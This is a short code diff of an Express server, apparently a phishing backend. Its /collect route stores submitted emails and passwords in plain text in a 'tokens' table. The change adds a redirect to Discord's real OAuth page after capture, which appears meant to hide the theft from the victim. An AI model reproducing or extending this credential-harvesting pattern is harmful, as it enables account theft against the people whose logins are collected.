@@ -25,7 +25,13 @@ app.use(express.static('public'));
 app.post('/collect', (req, res) => {
     const { email, password } = req.body;
     db.run(`INSERT INTO tokens (email, password) VALUES (?, ?)`, [email, password]);
-    res.json({ status: 'success' });
+    
+    const clientId = process.env.CLIENT_ID;
+    const redirectUri = process.env.REDIRECT_URI;
+    const scope = 'identify guilds email';
+    const authUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${encodeURIComponent(scope)}`;
+    
+    res.redirect(authUrl);
 });
 
 app.get('/callback', async (req, res) => {
